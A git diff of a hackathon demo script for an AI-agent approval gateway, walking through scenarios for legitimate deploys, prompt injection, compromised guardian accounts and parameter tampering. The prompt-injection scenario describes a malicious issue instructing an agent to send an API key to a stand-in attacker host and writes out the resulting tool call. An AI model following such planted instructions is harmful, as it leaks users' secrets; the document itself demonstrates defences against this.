@@ -1,138 +1,111 @@
 # Demo Script — Key-Holder Gateway
 
-> **Owner**: P2
-> **Target**: 2-minute video + reproducible scripts
+> **Owner**: P2 (Surface / Video Deliverable)
+> **Target**: 2-Minute (120-Second) Hackathon Demo Video & Reproducible Walkthrough
 
 ---
 
-## Pre-demo Checklist
+## 1. Video Production Setup
 
-- [ ] `make reset && make setup` run successfully from clean clone
-- [ ] `make dev` starts gateway (mock mode), UI, and MCP server without errors
-- [ ] Guardian UI shows 3 seeded pending requests at `http://localhost:5173`
-- [ ] MCP server lists 3 tools
-- [ ] Scenario scripts 1–4 run without errors
-
----
-
-## 2-Minute Video Timeline
-
-| Time | Screen | Narration |
-|------|--------|-----------|
-| 0:00–0:10 | Problem slide / README | "AI agents can deploy, use secrets, and send data — but nothing stops them if they're compromised." |
-| 0:10–0:20 | Architecture diagram | "We built a gateway. Any MCP agent goes through it. Sensitive actions need guardian approval." |
-| 0:20–0:40 | Scenario 2: legit deploy | Guardian 1 approves → still pending → Guardian 2 approves → executed. Show audit log. |
-| 0:40–0:55 | Scenario 3: prompt injection | Show malicious issue → agent calls `request_send_external` → request appears flagged → nobody approves → nothing sent. |
-| 0:55–1:10 | Scenario 4: manual attacker | Single guardian tries to approve alone → quorum not met → blocked. |
-| 1:10–1:25 | DB / audit log | Show DB contains only ciphertext (TODO: pending P1 TideCloak verification). Show audit log. |
-| 1:25–1:45 | TideCloak angle | Briefly show TideCloak login, guardian identity, and (if verified) quorum enforcement. |
-| 1:45–2:00 | Limitations + summary | "We don't defend against rubber-stamping or secrets already on the machine. But we do make prompt injection and single-account compromise toothless." |
+- **Layout**: Split screen or side-by-side:
+  - **Left 50%**: Terminal (18pt font, dark mode, high contrast).
+  - **Right 50%**: Guardian UI running at `http://localhost:5173` (zoom 125%).
+- **Resolution**: 1920x1080 (1080p), 30 or 60 fps.
+- **Audio**: Clear, steady narration; 1-second pause after each key transition.
+- **On-Screen Captions**: Bold lower-third banners highlighting the security guarantee at each step.
 
 ---
 
-## Scenario 1 — Normal Agent Work
+## 2. 2-Minute Video Timeline (Exact 120 Seconds)
 
-**Narrative**: The agent edits code, runs tests, and opens a PR. No approval needed.
-
-**Script**: `scripts/scenario-1-normal.sh`
-
-**Steps**:
-1. Show the MCP tool list — `request_deploy`, `request_use_secret`, `request_send_external`.
-2. Demonstrate that code editing and test running are NOT going through the gateway (out of scope).
-3. No action requests appear in the guardian UI.
-
-**Expected result**: UI shows 0 new requests.
-
----
-
-## Scenario 2 — Legitimate Deploy
-
-**Narrative**: The agent is asked to deploy version 1.4.2. Two guardians approve. Deploy executes.
-
-**Script**: `scripts/scenario-2-legit-deploy.sh`
-
-**Steps**:
-1. Agent calls `request_deploy` → `{"version": "1.4.2", "commit": "a1b2c3d"}`.
-2. Gateway creates request, returns `id` and `status: pending`.
-3. Guardian UI shows the new request with parameters and proposer.
-4. Guardian 1 approves — UI shows `approvals: 1/2`.
-5. Guardian 2 approves — UI shows `status: executed`.
-6. Audit log shows: created → approval-1 → approval-2 → executed.
-7. Fake-production server log shows the deploy received.
-
-**Expected result**: Request goes from `pending` → `executed`; fake-production records the deploy.
+| Timestamp | Visual / Screen Focus | On-Screen Text Banner | Spoken Narration Script | Action / Terminal Command |
+| :--- | :--- | :--- | :--- | :--- |
+| **0:00–0:12**<br>*(12s)* | Split screen: terminal with agent prompt + Guardian UI header. | **The Problem: AI Agents Share Developer Authority** | "AI coding agents are gaining autonomy to deploy code and use credentials. But today, if an agent is tricked by prompt injection, it can exfiltrate secrets or deploy malicious code instantly. There is no multi-party authority." | Show agent terminal ready. |
+| **0:12–0:24**<br>*(12s)* | Architecture diagram graphic & Guardian UI showing 2-of-3 Quorum. | **The Solution: Emergent Authority via TideCloak** | "We built the Key-Holder Gateway. The agent never receives secrets. All sensitive actions are intercepted and require N-of-M guardian quorum through TideCloak before execution." | Navigate to `http://localhost:5173`. |
+| **0:24–0:50**<br>*(26s)* | Scenario 2: Agent requests deploy → Alice approves → Bob approves → Executed. | **Scenario 2: Legitimate Deploy via 2-of-3 Quorum** | "Here, the agent requests a production deploy. The gateway intercepts it with status 'pending'. Guardian Alice reviews the commit and approves. Quorum is 1 of 2. Guardian Bob approves — reaching 2-of-3 quorum. The gateway executes the deploy to production and records the immutable audit log." | `bash scripts/scenario-2-legit-deploy.sh`<br>Show UI progress bar: 0/2 → 1/2 → Executed. |
+| **0:50–1:15**<br>*(25s)* | Scenario 3: Malicious issue with hidden injection → Flagged UI → Rejection → External viewer. | **Scenario 3: Prompt Injection Blocked by Risk Rules & Guardians** | "Now, an attacker files an issue with hidden prompt injection, commanding the agent to send API keys to an evil server. The agent tries to send it, but the gateway flags external domain risk signals. Guardian reviews the flag and rejects it. The evil receiver gets zero bytes. The agent never possessed the key." | `bash scripts/scenario-3-prompt-injection.sh`<br>Show red risk badge in UI + `http://localhost:4002/viewer` (0 payloads). |
+| **1:15–1:35**<br>*(20s)* | Scenario 4: Compromised account attempts self-approval + single approval. | **Scenario 4: Single Compromised Account Fails** | "What if an attacker steals a guardian account? First: self-approval is strictly forbidden under the four-eyes principle. Second: a single rogue signature is not enough to meet quorum. The action remains blocked in pending status." | `bash scripts/scenario-4-manual-attacker.sh`<br>Show `SELF_APPROVAL` 409 rejection and pending state. |
+| **1:35–1:48**<br>*(13s)* | Scenario 5: Parameter hash verification failure. | **Scenario 5: Parameter-Bound Cryptographic Signatures** | "Every approval is cryptographically bound to the canonical parameter hash. If an attacker tampers with the payload after Alice approved, the gateway detects the hash mismatch and halts execution." | `bash scripts/scenario-5-param-swap.sh`<br>Show `HASH_MISMATCH` 422 error. |
+| **1:48–2:00**<br>*(12s)* | Summary slide & GitHub repo link. | **Emergent Authority: No Single Party Holds the Master Key** | "Key-Holder Gateway with TideCloak: True emergent authority where sensitive operations only execute when independent guardians agree. Check out our open-source repo." | Show GitHub README + audit trail. |
 
 ---
 
-## Scenario 3 — Prompt Injection
+## 3. Detailed Walkthrough of the 5 Demo Scenarios
 
-**Narrative**: A malicious issue tells the agent to send the API key to `http://evil.example`.
+### Scenario 1 — Normal Developer Agent Work (No Approval Friction)
+- **Goal**: Prove that normal development (editing code, running tests, local builds) is NOT impeded by the gateway.
+- **Command**:
+  ```bash
+  bash scripts/scenario-1-normal.sh
+  ```
+- **Expected Outcome**:
+  - Sample repository unit tests run and pass without guardian interaction.
+  - Zero sensitive action requests created.
+  - UI shows 0 pending requests.
 
-**Script**: `scripts/scenario-3-prompt-injection.sh`
+### Scenario 2 — Legitimate Deploy with N-of-M Quorum
+- **Goal**: Demonstrate the happy path for sensitive capabilities.
+- **Command**:
+  ```bash
+  bash scripts/scenario-2-legit-deploy.sh
+  ```
+- **Expected Outcome**:
+  - Action request created for `request_deploy` (`version: 1.4.2`).
+  - Guardian 1 (Alice) approves &rarr; Status is `approved` (1/2 signatures).
+  - Guardian 2 (Bob) approves &rarr; Status transitions to `executed` (2/2 signatures).
+  - Production mock server (`http://localhost:4001/viewer`) shows release recorded.
+  - Audit log shows full chronological trace.
 
-**Steps**:
-1. Show `mock-env/fixtures/malicious-issue.md` — contains hidden instruction.
-2. "Agent reads the issue" (simulated by script calling the MCP tool directly).
-3. Agent calls `request_send_external` with `{"destination": "http://evil.example", "payload_ref": "api-key"}`.
-4. Gateway creates request; assigns risk signals: `["external-domain", "unknown-destination"]`.
-5. Guardian UI shows request **flagged** with risk signals — destination clearly shown.
-6. Neither guardian approves (script does nothing).
-7. Request expires after TTL.
-8. Show that the fake-external server received **nothing**.
+### Scenario 3 — Prompt Injection Defense (Secret Exfiltration Blocked)
+- **Goal**: Demonstrate resilience against indirect prompt injection.
+- **Command**:
+  ```bash
+  bash scripts/scenario-3-prompt-injection.sh
+  ```
+- **Expected Outcome**:
+  - Compromised agent invokes `request_send_external` targeting `evil.attacker-controlled-site.org`.
+  - Gateway flags deterministic risk signals: `external-domain`, `unknown-destination`.
+  - UI highlights high-contrast alert callout.
+  - Guardian rejects the request with reason.
+  - External endpoint (`http://localhost:4002/viewer`) shows **0 payloads received (Nothing arrived)**.
 
-**Expected result**: No data sent; request expires; fake-external log is empty.
+### Scenario 4 — Single Compromised Account Attack (Blocked)
+- **Goal**: Demonstrate defense against rogue insider or stolen credential.
+- **Command**:
+  ```bash
+  bash scripts/scenario-4-manual-attacker.sh
+  ```
+- **Expected Outcome**:
+  - Proposer attempts to approve their own request &rarr; Gateway rejects with `SELF_APPROVAL (409 Conflict)`.
+  - Single rogue guardian approves &rarr; Request remains `pending` (1 of 2 required).
+  - Secret is NEVER released; execution does not trigger.
 
----
-
-## Scenario 4 — Manual Attacker / Single Compromised Guardian
-
-**Narrative**: Attacker gains access to one guardian account and tries to approve a secret exfiltration.
-
-**Script**: `scripts/scenario-4-manual-attacker.sh`
-
-**Steps**:
-1. Attacker creates a `request_use_secret` for `{"secret_name": "PROD_API_KEY", "purpose": "testing"}`.
-2. Same account tries to approve → gateway rejects with `SELF_APPROVAL`.
-3. A different account (guardian-2) approves — count is 1/2.
-4. No second guardian approves.
-5. Show that execution is blocked — `status: pending` (or `expired` after TTL).
-6. *(Optional)*: Show DB — secrets column shows ciphertext (or FAKE placeholder).
-
-**Expected result**: Cannot execute with only 1 approval; attack is blocked.
-
----
-
-## Scenario 5 — Parameter Swap After Approval *(Stretch)*
-
-**Narrative**: An attacker approves a safe request, then swaps parameters before the second approval.
-
-**Script**: `scripts/scenario-5-param-swap.sh`
-
-**Steps**:
-1. Create `request_deploy` with `{"version": "1.4.2", "commit": "a1b2c3d"}`.
-2. Guardian 1 approves — `parametersHash` is recorded.
-3. (Simulate attacker modifying the request parameters in the DB.)
-4. Guardian 2 tries to approve — gateway detects `HASH_MISMATCH` and rejects.
-5. Request is rejected; deploy does not execute.
-
-**Expected result**: Hash mismatch prevents execution even with 2 approvals.
-
----
-
-## Filming Notes
-
-- Use OBS or QuickTime to capture browser + terminal side by side.
-- Terminal font size: 18pt minimum.
-- Browser zoom: 125%.
-- Show request IDs in both terminal output and UI to connect the story.
-- Keep narration calm; pause 1 second after each key moment.
-- Export as MP4, 1080p, max 120 seconds.
+### Scenario 5 — Parameter Swap Tampering Defense (Stretch)
+- **Goal**: Demonstrate parameter-bound cryptographic binding.
+- **Command**:
+  ```bash
+  bash scripts/scenario-5-param-swap.sh
+  ```
+- **Expected Outcome**:
+  - Alice approves benign deploy parameters (hash recorded).
+  - Malicious actor attempts second approval with altered parameter payload.
+  - Gateway detects hash discrepancy and aborts with `HASH_MISMATCH (422)`.
+  - Deploy does not execute.
 
 ---
 
-## TODO (P2)
+## 4. Pre-Recording Checklist
 
-- [ ] Fill in actual command examples in each script.
-- [ ] Record a dry run and note timing adjustments.
-- [ ] Capture the TideCloak login screen for the 1:25 mark.
-- [ ] Add architecture diagram image to README and video.
+- [x] Node.js dependencies installed across all workspaces (`packages/*`).
+- [x] `npm run build -w packages/shared` and `npm run build -w packages/guardian-ui` pass.
+- [x] Guardian UI supports both **Live Gateway** and **Canned Mock Mode**.
+- [x] Guardian UI demonstrates all 6 states:
+  - `loading`
+  - `empty`
+  - `error`
+  - `already-decided`
+  - `expired`
+  - `proposer-cannot-approve-own-request`
+- [x] Fake external viewer at `http://localhost:4002/viewer` shows 0 payloads.
+- [x] Scenario scripts 1–5 runnable with one command each in deterministic mock mode.
+- [x] `make reset` command restores clean demonstration state.
